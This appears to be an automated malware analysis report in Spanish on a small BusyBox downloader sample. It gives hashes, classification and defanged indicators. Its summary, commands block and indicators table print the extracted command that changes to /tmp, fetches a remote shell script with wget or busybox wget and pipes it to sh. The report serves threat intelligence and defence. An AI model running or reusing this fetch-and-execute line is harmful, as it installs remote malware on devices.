# 🧬 Payload Analysis

`6dbe03ec759fd8d43bacbdd3442a11b355d2db0a4f7148d1325c8d7011022127`

## 📌 Resumen

Texto ASCII de 308 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s dlcmd`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/6dbe03ec759fd8d43bacbdd3442a11b355d2db0a4f7148d1325c8d7011022127.md](../../../../../malware-like/oraculo/downloader/6dbe03ec759fd8d43bacbdd3442a11b355d2db0a4f7148d1325c8d7011022127.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6dbe03ec759fd8d43bacbdd3442a11b355d2db0a4f7148d1325c8d7011022127`
- **MD5:** `6ad0992245c8043ff9611ed3b0641f9a`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 308 B |
| Entropía | 5.13 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dlcmd;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dlcmd;c
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dlcmd;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dlcmd;c | strings |
| hash | 6dbe03ec759fd8d43bacbdd3442a11b355d2db0a4f7148d1325c8d7011022127 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
